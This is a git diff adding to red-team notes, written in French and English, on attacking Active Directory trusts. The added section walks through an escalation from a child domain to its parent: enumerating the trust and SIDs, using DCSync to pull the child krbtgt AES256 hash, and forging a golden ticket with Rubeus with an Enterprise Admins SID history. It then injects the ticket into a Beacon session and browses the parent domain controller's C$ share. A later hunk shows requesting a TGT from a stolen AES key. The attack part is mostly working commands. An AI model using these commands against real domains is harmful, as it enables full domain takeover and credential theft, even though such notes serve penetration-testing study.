@@ -135,6 +135,53 @@ Où :
 - `/sids` est la liste des SID à inclure dans le SID history du ticket.
 - `/krbkey` est le hash AES256 du compte krbtgt du domaine enfant.
 
+## Enumeration
+
+1. Enumerate the trust.
+```
+ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
+```
+
+2. Obtain the domain SID for the child domain.
+```
+ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid
+```
+
+3. Obtain the SID for parent domain's Enterprise Admins group.
+```
+ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
+```
+
+## Credential Access
+
+1. Impersonate a ``Domain Admin`` user.
+2. Obtain the AES256 hash for the child domain's krbtgt account.
+```
+dcsync dublin.contoso.com DUBLIN\krbtgt
+```
+## Exploitation
+
+1. On the Attacker Desktop, forge a golden ticket and output to a kirbi file.
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\golden
+```
+
+2. Inject the ticket into the Beacon session.
+```
+kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN TICKET]
+```
+
+3. Verify the ticket is in the session.
+```
+run klist
+```
+
+4. Access the parent domain's domain controller.
+```
+ls \\lon-dc-1\c$
+```
+
+---
 # Inbound Trusts
 
 Une relation à sens unique est créée quand on veut partager des ressources avec un domaine approuvé, sans que le domaine approbateur puisse accéder au sien (migrations, transferts de données, etc.).
@@ -281,7 +328,7 @@ ldapsearch (samAccountType=805306369) --hostname par-dc-1.partner.com --dn DC=pa
 ```
 dcsync contoso.com CONTOSO\rsteel
 ```
-3. Obtain a TGT for _rsteel_ (using aes256_hmac).
+3. Obtain a TGT for _rsteel_ (using aes256_hmac) -> (you could just inject TGT and let windows ask TGS)
 ```
 krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
 ```
